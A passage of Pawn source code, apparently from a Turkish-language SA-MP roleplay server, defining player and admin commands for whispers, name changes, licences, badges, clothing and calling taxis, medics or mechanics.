		if(HidePM[giveplayerid] > 0 && AdminDuty[playerid] == 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "Oyuncu fýsýltýyý bloklamýþ!");
			return 1;
		}
		new giveplayer[MAX_PLAYER_NAME], sendername[MAX_PLAYER_NAME], string[128];
		sendername = GetPlayerNameEx(playerid);
		giveplayer = GetPlayerNameEx(giveplayerid);
		if(giveplayerid == playerid)
		{
			if(PlayerInfo[playerid][pSex] == 1) format(string, sizeof(string), "* %s kendi kendine homurdanýr.", GetPlayerNameEx(playerid));
			else format(string, sizeof(string), " %s kendi kendine homurdanýr.", GetPlayerNameEx(playerid));
			return ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
		if(ProxDetectorS(5.0, playerid, giveplayerid) || AdminDuty[playerid] == 1)
		{
			format(string, sizeof(string), "%s (ID %d) sana fýsýldadý: %s", GetPlayerNameEx(playerid), playerid, whisper);

			if(strlen(string) > 92)
			{
				new firstline[128], secondline[128];
				strmid(firstline, string, 0, 88);
				strmid(secondline, string, 88, 128);
				format(firstline, sizeof(firstline), "%s ...", firstline);
				SendClientMessage(giveplayerid, COLOR_YELLOW, firstline);
				SendClientMessage(giveplayerid, COLOR_YELLOW, secondline);
			}
			else SendClientMessage(giveplayerid,COLOR_YELLOW, string);

			format(string, sizeof(string), " %s oyuncusuna fýsýldadýn: %s", GetPlayerNameEx(giveplayerid),whisper);
			if(strlen(string) > 92)
			{
				new firstline[128], secondline[128];
				strmid(firstline, string, 0, 88);
				strmid(secondline, string, 88, 128);
				format(firstline, sizeof(firstline), "%s ...", firstline);
				SendClientMessage(playerid, COLOR_YELLOW, firstline);
				SendClientMessage(playerid, COLOR_YELLOW, secondline);
			}
			else SendClientMessage(playerid,COLOR_YELLOW, string);
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
		}
		return 1;
	}
	else
	{
		HataMesajiYolla(playerid,"Oyunda böyle bir oyuncu yok!");
	}
	return 1;
}

CMD:fisiltikapat(playerid, params[])
{
	if(!HidePM[playerid])
	{
		HidePM[playerid] = 1;
		SendClientMessage(playerid, COLOR_GRAD2, "Fýsýltý sohbetini kapattýn.");
	}
	else
	{
		HidePM[playerid] = 0;
		SendClientMessage(playerid, COLOR_GRAD2, "Fýsýltý sohbetini açtýn.");
	}
	return 1;
}

CMD:parasutal(playerid, params[]) {
	if(IsPlayerInRangeOfPoint(playerid, 2.0, 1544.2, -1353.4, 329.4)) { // Startower parachute
	    if(PlayerInfo[playerid][pGuns][11] == 46)
	        RemovePlayerWeapon(playerid, 46);

 		if(PlayerInfo[playerid][pGuns][11] != 46) {
    		GivePlayerValidWeapon(playerid, 46, 99999);
		}
		else SendClientMessage(playerid, COLOR_GREY,"Zaten bir paraþütün var.");
	}
	else SendClientMessage(playerid, COLOR_GREY,"Startower'daki paraþüte yeterince yakýn deðilsin.");
	return 1;
}

CMD:isimdegistir(playerid, params[])
{
	if(IsAtNameChange(playerid))
	{
		if(AdminDuty[playerid] == 1)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþý yaparken buna eriþemezsin.");
			return 1;
	    }
		if(PlayerInfo[playerid][pFaction] == 2 && PlayerInfo[playerid][pRank] >= 3 || PlayerInfo[playerid][pFaction] == 4)
		{
			ShowPlayerDialogEx(playerid, DIALOG_NAMECHANGE, DIALOG_STYLE_INPUT, "Isim Deðiþtirme","Istediðin ismi yaz!\n\nNot: Isim Deðiþtirme Hitman ve FBI için ücretsiz.", "Deðiþtir", "Iptal");
		}
		else
		{
			ShowPlayerDialogEx(playerid, DIALOG_NAMECHANGE, DIALOG_STYLE_INPUT, "Isim Deðiþtirme","Istediðin ismi yaz!\n\nNot: Isim Deðiþtirme level baþýna $15000.", "Deðiþtir", "Iptal");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "   Isim Deðiþtirme yerinde deðilsin!");
	}
	return 1;
}

CMD:nrn(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 3) {
		new string[128], giveplayerid;

		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /nrn [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid)) {
			if(PlayerInfo[giveplayerid][pAdmin] >= 1 || PlayerInfo[giveplayerid][pHelper] >= 2 || PlayerInfo[giveplayerid][pLevel] >= 2 && PlayerInfo[playerid][pAdmin] < 1)
				return SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu adminler, yardýmcýlar veya Level 1'den yüksek oyuncular için kullanamazsýn (eðer bir yardýmcýysan).");

			format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s,%s kiþisine ücretsiz isim deðiþikliði önerdi. Sebep: non-RP isim.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ABroadCast(COLOR_YELLOW, string, 1);
			ShowPlayerDialogEx(giveplayerid, DIALOG_NAMECHANGE2, DIALOG_STYLE_INPUT, "Bu bir roleplay sunucusudur. Isminiz Ad_Soyad formatýnda olmalýdýr. \nÖrnek: Burak_Yilmaz veya Wesley_Sneijder\n\n Admin ismini ücretsiz olarak uygun formata göre çevirmeni önerdi. Istediðin ismi aþaðýya yaz.\n\nNot: Iptal'e basarsan sunucudan atýlacaksýn.", "Deðiþtir", "Iptal","");

			format(string, sizeof(string), "%s kiþisini isim deðiþikliðine zorladýn.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_WHITE, string);

			SetPVarInt(giveplayerid, "requestpath", 1);

			if(strlen(PlayerInfo[giveplayerid][pFlag]) == 0)
            	AddFlag(giveplayerid, playerid, "Non-RP isim, deðiþtirilmesi gerekiyor");
		}
	}

	return 1;
}

CMD:nchange(playerid, params[])
	return cmd_namechanges(playerid, params);

CMD:namechanges(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
 	{
		new
			nstring[64 + (MAX_PLAYER_NAME * 2)],
			newname[MAX_PLAYER_NAME];

  		SendClientMessage(playerid, COLOR_GREEN, "* Isim deðiþikliði beklemede:");
   		foreach(Player, i)
		{
			if(GetPVarType(i, "RequestingNameChange"))
			{
  				GetPVarString(i, "NewNameRequest", newname, MAX_PLAYER_NAME);
				format(nstring, sizeof(nstring), "Þu anki isim: %s (ID: %d) | Istenen isim: %s | Ücret: %d", GetPlayerNameEx(i), i, newname, GetPVarInt(i, "NameChangeCost"));
				SendClientMessage(playerid, COLOR_YELLOW, nstring);
			}
		}
		SendClientMessage(playerid, COLOR_GREEN, "_____________________________________________________");
	}
	return 1;
}

CMD:ikabul(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 1)
	    return SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma yetkin yok.");

	new
	    iTarget,
		szQuery[128];

	if(sscanf(params, "u", iTarget))
	    return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ikabul [Oyuncu ID/Ýsim]");

	if(iTarget == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");

    if(GetPVarInt(iTarget, "RequestingNameChange") == 0)
		return SendClientMessage(playerid, COLOR_GREY, "Belirlenen oyuncu isim deðiþikliði talep etmemiþ.");

	new
	    szPlayerName[MAX_PLAYER_NAME];

    GetPVarString(iTarget, "NewNameRequest", szPlayerName, MAX_PLAYER_NAME);
    SetPVarInt(iTarget, "requestby", playerid);

    mysql_real_escape_string(szPlayerName, szPlayerName, g_MySQLConnections[0]);

    SetPVarString(iTarget, "requestedname", szPlayerName);

    format(szQuery, sizeof(szQuery), "SELECT Username FROM players WHERE Username = '%s'", szPlayerName);
	mysql_query(szQuery, THREAD_CHECK_NEW_NAME, iTarget, g_MySQLConnections[0]);
	return 1;
}

CMD:ired(playerid, params[])
{
	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ired [Oyuncu ID/Ýsim]");

	if(IsPlayerConnected(giveplayerid))
	{
		if(PlayerInfo[playerid][pAdmin] >= 1)
		{
			if(GetPVarInt(giveplayerid, "RequestingNameChange") == 0)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Oyuncu isim deðiþikliði istememiþ!");
				return 1;
			}

			SendClientMessage(giveplayerid,COLOR_YELLOW," Isim deðiþtirme isteðin reddedildi.");
			format(string, sizeof(string), "%s, %s kiþisinin isim deðiþikliðini reddetti",GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid));
			ABroadCast(COLOR_YELLOW, string, 1);
			DeletePVar(giveplayerid, "RequestingNameChange");
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkin yok.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Böyle bir oyuncu yok.");
	}
	return 1;
}

CMD:camdanbak(playerid, params[])
{
	new string[128];
    if(InsideShamal[playerid] != INVALID_VEHICLE_ID)
	{
        if(GetPlayerInterior(playerid) == 1)
		{
            new
                Float: fSpecPos[6];

            GetPlayerPos(playerid, fSpecPos[0], fSpecPos[1], fSpecPos[2]);
            GetPlayerFacingAngle(playerid, fSpecPos[3]);
            GetPlayerHealth(playerid, fSpecPos[4]);
            GetPlayerArmour(playerid, fSpecPos[5]);

            SetPVarFloat(playerid, "air_Xpos", fSpecPos[0]);
            SetPVarFloat(playerid, "air_Ypos", fSpecPos[1]);
            SetPVarFloat(playerid, "air_Zpos", fSpecPos[2]);
            SetPVarFloat(playerid, "air_Rpos", fSpecPos[3]);
            SetPVarFloat(playerid, "air_HP", fSpecPos[4]);
            SetPVarFloat(playerid, "air_Arm", fSpecPos[5]);

            SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid, 0);
            TogglePlayerSpectating(playerid, 1);
            PlayerSpectateVehicle(playerid, InsideShamal[playerid]);

            format(string, sizeof(string), "* %s camdan dýþarý göz atar.", GetPlayerNameEx(playerid));
            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
        }
        else TogglePlayerSpectating(playerid, 0);
    }
    return 1;
}

CMD:hesapla(playerid, params[])
{
	new string[128], method[20], value1, value2;
	if(sscanf(params, "ds[20]d", value1, method, value2))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /hesapla [value] [operation] [value].");
		SendClientMessage(playerid, COLOR_GRAD2, "Iþlemler: Topla, Çýkar, Çarp, Böl.");
		return 1;
	}

	if(strcmp(method,"multiply",true) == 0 || strcmp(method,"*",true) == 0)
	{
		new sum = value1*value2;
		format(string,sizeof(string),"%d çarpý %d eþittir %d.",value1,value2,sum);
		SendClientMessage(playerid,COLOR_WHITE,string);
	}
	if(strcmp(method,"divide",true) == 0 || strcmp(method,"/",true) == 0)
	{
		if(value2 == 0)
			return GameTextForPlayer(playerid, "face~r~palm", 1000, 3);

		new sum = value1/value2;
		format(string,sizeof(string),"%d bölü %d eþittir %d.",value1,value2,sum);
		SendClientMessage(playerid,COLOR_WHITE,string);
	}
	if(strcmp(method,"add",true) == 0 || strcmp(method,"+",true) == 0)
	{
		new sum = value1+value2;
		format(string,sizeof(string),"%d artý %d eþittir %d.",value1,value2,sum);
		SendClientMessage(playerid,COLOR_WHITE,string);
	}
	if(strcmp(method,"subtract",true) == 0 || strcmp(method,"-",true) == 0)
	{
		new sum = value1-value2;
		format(string,sizeof(string),"%d eksi %d eþittir %d.",value1,value2,sum);
		SendClientMessage(playerid,COLOR_WHITE,string);
	}
	return 1;
}

CMD:kills(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /kills [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
			format(string, sizeof(string), "<< %s kiþisinin Son 10 Öldürdüðü >>", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_YELLOW, string);

			if(!isnull(PlayerInfo[giveplayerid][pKillLog9]))
				SendClientMessage(playerid, COLOR_YELLOW, PlayerInfo[giveplayerid][pKillLog9]);
			if(!isnull(PlayerInfo[giveplayerid][pKillLog8]))
				SendClientMessage(playerid, COLOR_YELLOW, PlayerInfo[giveplayerid][pKillLog8]);
			if(!isnull(PlayerInfo[giveplayerid][pKillLog7]))
				SendClientMessage(playerid, COLOR_YELLOW, PlayerInfo[giveplayerid][pKillLog7]);
			if(!isnull(PlayerInfo[giveplayerid][pKillLog6]))
				SendClientMessage(playerid, COLOR_YELLOW, PlayerInfo[giveplayerid][pKillLog6]);
			if(!isnull(PlayerInfo[giveplayerid][pKillLog5]))
				SendClientMessage(playerid, COLOR_YELLOW, PlayerInfo[giveplayerid][pKillLog5]);
			if(!isnull(PlayerInfo[giveplayerid][pKillLog4]))
				SendClientMessage(playerid, COLOR_YELLOW, PlayerInfo[giveplayerid][pKillLog4]);
			if(!isnull(PlayerInfo[giveplayerid][pKillLog3]))
				SendClientMessage(playerid, COLOR_YELLOW, PlayerInfo[giveplayerid][pKillLog3]);
			if(!isnull(PlayerInfo[giveplayerid][pKillLog2]))
				SendClientMessage(playerid, COLOR_YELLOW, PlayerInfo[giveplayerid][pKillLog2]);
			if(!isnull(PlayerInfo[giveplayerid][pKillLog1]))
				SendClientMessage(playerid, COLOR_YELLOW, PlayerInfo[giveplayerid][pKillLog1]);
			if(!isnull(PlayerInfo[giveplayerid][pKillLog0]))
				SendClientMessage(playerid, COLOR_YELLOW, PlayerInfo[giveplayerid][pKillLog0]);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:kiyafetler(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 9) {
        return ShowPlayerDialogEx(playerid, DIALOG_SAN_CLOTHES, DIALOG_STYLE_LIST, "Kuruluþ kýyafetleri", "Erkek Röportajcý (ID: 113)\nBayan Röportajcý (ID: 148)", "Tamam", "Iptal");
	}
	else if(PlayerInfo[playerid][pGang] != 255) {
		if(IsAtClothShop(playerid)) {
			new string[128];
			new PG = PlayerInfo[playerid][pGang];

			if(FamilyInfo[PG][FamilyMaxSkins] == 0)
			{
            	SendClientMessage(playerid, COLOR_WHITE, "Aile skinin henüz bir admin tarafýndan ayarlanmadý.");
			}
			if(FamilyInfo[PG][FamilyMaxSkins] == 1)
			{
  				format(string,sizeof(string),"Skin 1: %d", FamilyInfo[PG][FamilySkins][0]);
				ShowPlayerDialogEx(playerid,FAMILYSKINDIALOG,DIALOG_STYLE_LIST,"Aile skin seçimi",string,"Seç","Iptal");
			}
			if(FamilyInfo[PG][FamilyMaxSkins] == 2)
			{
				format(string,sizeof(string),"Skin 1: ID %d\nSkin 2: ID %d", FamilyInfo[PG][FamilySkins][0], FamilyInfo[PG][FamilySkins][1]);
				ShowPlayerDialogEx(playerid,FAMILYSKINDIALOG,DIALOG_STYLE_LIST,"Aile skin seçimi",string,"Seç","Iptal");
			}
			if(FamilyInfo[PG][FamilyMaxSkins] == 3)
			{
				format(string,sizeof(string),"Skin 1: ID %d\nSkin 2: ID %d\nSkin 3: ID %d", FamilyInfo[PG][FamilySkins][0], FamilyInfo[PG][FamilySkins][1], FamilyInfo[PG][FamilySkins][2]);
				ShowPlayerDialogEx(playerid,FAMILYSKINDIALOG,DIALOG_STYLE_LIST,"Aile skin seçimi",string,"Seç","Iptal");
			}
			if(FamilyInfo[PG][FamilyMaxSkins] == 4)
			{
				format(string,sizeof(string),"Skin 1: ID %d\nSkin 2: ID %d\nSkin 3: ID %d\nSkin 4: ID %d", FamilyInfo[PG][FamilySkins][0], FamilyInfo[PG][FamilySkins][1], FamilyInfo[PG][FamilySkins][2], FamilyInfo[PG][FamilySkins][3]);
				ShowPlayerDialogEx(playerid,FAMILYSKINDIALOG,DIALOG_STYLE_LIST,"Aile skin seçimi",string,"Seç","Iptal");
			}
			if(FamilyInfo[PG][FamilyMaxSkins] == 5)
			{
				format(string,sizeof(string),"Skin 1: ID %d\nSkin 2: ID %d\nSkin 3: ID %d\nSkin 4: ID %d\nSkin 5: ID %d", FamilyInfo[PG][FamilySkins][0], FamilyInfo[PG][FamilySkins][1], FamilyInfo[PG][FamilySkins][2], FamilyInfo[PG][FamilySkins][3], FamilyInfo[PG][FamilySkins][4]);
				ShowPlayerDialogEx(playerid,FAMILYSKINDIALOG,DIALOG_STYLE_LIST,"Aile skin seçimi",string,"Seç","Iptal");
			}
   			if(FamilyInfo[PG][FamilyMaxSkins] == 6)
			{
				format(string,sizeof(string),"Skin 1: ID %d\nSkin 2: ID %d\nSkin 3: ID %d\nSkin 4: ID %d\nSkin 5: ID %d\nSkin 6: ID %d", FamilyInfo[PG][FamilySkins][0], FamilyInfo[PG][FamilySkins][1], FamilyInfo[PG][FamilySkins][2], FamilyInfo[PG][FamilySkins][3], FamilyInfo[PG][FamilySkins][4], FamilyInfo[PG][FamilySkins][5]);
				ShowPlayerDialogEx(playerid,FAMILYSKINDIALOG,DIALOG_STYLE_LIST,"Aile skin seçimi",string,"Seç","Iptal");
			}
			if(FamilyInfo[PG][FamilyMaxSkins] == 7)
			{
				format(string,sizeof(string),"Skin 1: ID %d\nSkin 2: ID %d\nSkin 3: ID %d\nSkin 4: ID %d\nSkin 5: ID %d\nSkin 6: ID %d\nSkin 7: ID %d", FamilyInfo[PG][FamilySkins][0], FamilyInfo[PG][FamilySkins][1], FamilyInfo[PG][FamilySkins][2], FamilyInfo[PG][FamilySkins][3], FamilyInfo[PG][FamilySkins][4], FamilyInfo[PG][FamilySkins][5], FamilyInfo[PG][FamilySkins][6]);
				ShowPlayerDialogEx(playerid,FAMILYSKINDIALOG,DIALOG_STYLE_LIST,"Aile skin seçimi",string,"Seç","Iptal");
			}
			if(FamilyInfo[PG][FamilyMaxSkins] == 8)
			{
				format(string,sizeof(string),"Skin 1: ID %d\nSkin 2: ID %d\nSkin 3: ID %d\nSkin 4: ID %d\nSkin 5: ID %d\nSkin 6: ID %d\nSkin 7: ID %d\nSkin 8: ID %d", FamilyInfo[PG][FamilySkins][0], FamilyInfo[PG][FamilySkins][1], FamilyInfo[PG][FamilySkins][2], FamilyInfo[PG][FamilySkins][3], FamilyInfo[PG][FamilySkins][4], FamilyInfo[PG][FamilySkins][5], FamilyInfo[PG][FamilySkins][6], FamilyInfo[PG][FamilySkins][7]);
				ShowPlayerDialogEx(playerid,FAMILYSKINDIALOG,DIALOG_STYLE_LIST,"Aile skin seçimi",string,"Seç","Iptal");
			}
			return 1;
		}
		else {
			SendClientMessage(playerid, COLOR_GRAD2, "   Kýyafet dükkanýnda deðilsin!");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid,COLOR_GREY, "   Ailede deðilsin, /kiyafetal komutunu kullan!");
	}
	return 1;
}

CMD:lisanslar(playerid, params[])
{
	new string[128], text1[20], text2[20], text4[20];
	if(PlayerInfo[playerid][pCarLic]) { text1 = "Mevcut"; } else { text1 = "Mevcut deðil"; }
	if(PlayerInfo[playerid][pFlyLic]) { text4 = "Mevcut"; } else { text4 = "Mevcut deðil"; }
	if(PlayerInfo[playerid][pBoatLic]) { text2 = "Mevcut"; } else { text2 = "Mevcut deðil"; }
	SendClientMessage(playerid, COLOR_WHITE, "Lisanslarýn...");
	format(string, sizeof(string), "** Sürücü lisansý: %s.", text1);
	SendClientMessage(playerid, COLOR_GREY, string);
	format(string, sizeof(string), "** Pilot lisansý: %s.", text4);
	SendClientMessage(playerid, COLOR_GREY, string);
	format(string, sizeof(string), "** Tekne lisansý: %s.", text2);
	SendClientMessage(playerid, COLOR_GREY, string);
	return 1;
}

CMD:lisansgoster(playerid, params[])
{
	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /lisansgoster [Oyuncu ID/Ýsim]");

	if(IsPlayerConnected(giveplayerid))
	{
		if(ProxDetectorS(8.0, playerid, giveplayerid))
		{
			if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Lisanslarý kendine gösteremezsin -  bunun için /lisanslar komutunu kullan."); return 1; }
			new text1[20], text2[20], text4[20];
			if(PlayerInfo[playerid][pCarLic]) { text1 = "Mevcut"; } else { text1 = "Mevcut deðil"; }
			if(PlayerInfo[playerid][pFlyLic]) { text4 = "Mevcut"; } else { text4 = "Mevcut deðil"; }
			if(PlayerInfo[playerid][pBoatLic]) { text2 = "Mevcut"; } else { text2 = "Mevcut deðil"; }
			format(string, sizeof(string), "%s kiþisinin lisanslarý...", GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_WHITE, string);
			format(string, sizeof(string), "** Sürücü lisansý: %s.", text1);
			SendClientMessage(giveplayerid, COLOR_GREY, string);
			format(string, sizeof(string), "** Pilot lisansý: %s.", text4);
			SendClientMessage(giveplayerid, COLOR_GREY, string);
			format(string, sizeof(string), "** Tekne lisansý: %s.", text2);
			SendClientMessage(giveplayerid, COLOR_GREY, string);
			format(string, sizeof(string), "* %s lisanslarýný sana gösterdi.", GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* Lisanslarýný %s kiþisine gösterdin.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* %s, lisanslarýný %s kiþisine gösterdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
			return 1;
		}

	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
		return 1;
	}
	return 1;
}

CMD:rozetgoster(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] >= 1 || PlayerInfo[playerid][pLeader] >= 1) {
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /rozetgoster [Oyuncu ID/Ýsim]");

		if(giveplayerid != INVALID_PLAYER_ID) {
			if(ProxDetectorS(5.0, playerid, giveplayerid)) {
				switch(PlayerInfo[playerid][pFaction]) {
					case 1, 2, 3, 5: {
						new
							infoArrays[3][64];

						GetPlayerFactionInfo(playerid, infoArrays[0], infoArrays[1], infoArrays[2]);

						SendClientMessage(giveplayerid, COLOR_GRAD2, "----------------------------------------------------------------------------------------------------");
						format(string, sizeof(string), "%s %s is kiþisi yeminli üyedir: %s (%s).", infoArrays[0], GetPlayerNameEx(playerid), infoArrays[2], infoArrays[1]);
						SendClientMessage(giveplayerid, COLOR_WHITE, string);
						format(string, sizeof(string), "Þu anki Görev: %s.", infoArrays[1]);
						SendClientMessage(giveplayerid, COLOR_WHITE, string);

						switch(PlayerInfo[playerid][pFaction]) {
							case 1: SendClientMessage(giveplayerid, COLOR_WHITE, "Los Santos þehri Hakimiyeti Altýnda.");
							case 2, 5: SendClientMessage(giveplayerid, COLOR_WHITE, "Amerika Birleþik Devletleri Hakimiyeti Altýnda.");
							default: SendClientMessage(giveplayerid, COLOR_WHITE, "San Andreas Eyaleti Hakimiyeti Altýnda.");
						}

						if(PlayerInfo[playerid][pFaction] != 3) SendClientMessage(giveplayerid, COLOR_WHITE, "Memur tutuklama yetkisine sahip.");
						if(PlayerInfo[playerid][pFaction] == 3) SendClientMessage(giveplayerid, COLOR_WHITE, "Memur tutuklamaya yardým yetkisine sahip.");
						SendClientMessage(giveplayerid, COLOR_GRAD2, "----------------------------------------------------------------------------------------------------");
						format(string, sizeof(string), "* %s shows their badge to %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					}
					default: SendClientMessage(playerid, COLOR_WHITE, "Sivil Servis kuruluþunda deðilsin.");
				}
			}
			else SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
		}
		else SendClientMessage(playerid, COLOR_WHITE, "Sivil Servis kuruluþunda deðilsin.");
	}
	return 1;
}

CMD:cagir(playerid, params[])
{
	new string[128], choice[32];
	if(sscanf(params, "s[32]", choice))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /cagir [name]");
		SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Isimler: Taksi, Otobus, Doktor, Tamirci, Ambulans");
		return 1;
	}

	if(PlayerInfo[playerid][pJailed] > 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Hapiste bunu kullanamazsýn.");
		return 1;
	}
	if(ServiceTime[playerid] > 0) return SendClientMessage(playerid, COLOR_WHITE, "Bu komutu tekrar kullanmak için 30 saniye beklemelisin.");

	if(strcmp(choice,"ambulans",true) == 0)
	{
		if(GetPVarInt(playerid, "Injured") == 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "   Yaralý deðilsin, Acil yardým çaðýramazsýn!");
			return 1;
		}
		new zone[MAX_ZONE_NAME];
		GetPlayer2DZone(playerid, zone, MAX_ZONE_NAME);
		SetPVarInt(playerid, "EMSAttempt", 1);
		SendClientMessage(playerid, COLOR_WHITE, "Acil yardým ekibi yerini biliyor ve yoldalar.");
		format(string, sizeof(string), "Acil Yardým raporuna göre (%d) %s, %s bölgesinden yaralý, Acil nakil aracý gerekiyor.",playerid, GetPlayerNameEx(playerid), zone);
		SendRadioMessage(3, TEAM_MED_COLOR, string);
		ServiceTime[playerid] = 30;
		return 1;
	}
	else if(strcmp(choice,"taksi",true) == 0)
	{
		if(TaxiDrivers < 1)
		{
			SendClientMessage(playerid, COLOR_GREY, "   Þu an iþbaþýnda taksici yok, daha sonra tekrar deneyin!");
			return 1;
		}
		if(TransportDuty[playerid] > 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "   Þu an taksi çaðýramazsýn!");
			return 1;
		}

		new
			szZoneName[MAX_ZONE_NAME];

		GetPlayer2DZone(playerid, szZoneName, MAX_ZONE_NAME);
		format(string, sizeof(string), "** %s, %s bölgesinde taksiye ihtiyacý var - /kabulet taksi yazarak çaðrýyý kabul edebilirsin.", GetPlayerNameEx(playerid), szZoneName);
		SendTaxiMessage(TEAM_AZTECAS_COLOR, string);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Taksi çaðýrdýn, Yanýt için bekle.");
		TaxiCall = playerid;
		ServiceTime[playerid] = 30;
		return 1;
	}
	else if(strcmp(choice,"otobus",true) == 0)
	{
		if(BusDrivers < 1)
		{
			SendClientMessage(playerid, COLOR_GREY, "   Þu an iþbaþýnda otobüs þoförü yok, daha sonra tekrar deneyin!");
			return 1;
		}
		if(TransportDuty[playerid] > 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "   Þu an otobüs çaðýramazsýn!");
			return 1;
		}
		format(string, sizeof(string), "** %s, %s bölgesinde otobüse ihtiyacý var - /kabulet otobus yazarak çaðrýyý kabul edebilirsin.", GetPlayerNameEx(playerid));
		SendBusMessage(TEAM_AZTECAS_COLOR, string);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Otobüs çaðýrdýn, Yanýt için bekle.");
		BusCall = playerid;
		ServiceTime[playerid] = 30;
		return 1;
	}
	else if(strcmp(choice,"doktor",true) == 0)
	{
		if(Medics < 1)
		{
			SendClientMessage(playerid, COLOR_GREY, "   Þuan iþbaþýnda ilkyardým ekibi yok, daha sonra tekrar deneyin!");
			return 1;
		}
		format(string, sizeof(string), "** %s, %s bölgesinde ilkyardýma ihtiyacý var - /kabulet doktor yazarak çaðrýyý kabul edebilirsin.", GetPlayerNameEx(playerid));
		SendRadioMessage(3, TEAM_AZTECAS_COLOR, string);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ilkyardým çaðýrdýn, Yanýt için bekle.");
		MedicCall = playerid;
		ServiceTime[playerid] = 30;
		return 1;
	}
	else if(strcmp(choice,"tamirci",true) == 0)
	{
		if(Mechanics < 1)
		{
			SendClientMessage(playerid, COLOR_GREY, "   Þu an iþbaþýnda tamirci yok, daha sonra tekrar deneyin!");
			return 1;
		}
		format(string, sizeof(string), "** %s, %s bölgesinde tamirciye ihtiyacý var - /kabulet tamirci yazarak çaðrýyý kabul edebilirsin.", GetPlayerNameEx(playerid));
		SendJobMessage(7, TEAM_AZTECAS_COLOR, string);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Tamirci çaðýrdýn, Yanýt için bekle.");
		MechanicCall = playerid;
		ServiceTime[playerid] = 30;
		return 1;
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   Bilinmeyen servis ismi!");
		return 1;
	}
}

CMD:oyuncakyardim(playerid, params[])
{
	SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
	SendClientMessage(playerid, COLOR_WHITE,"*** OYUNCAK YARDIM ***");
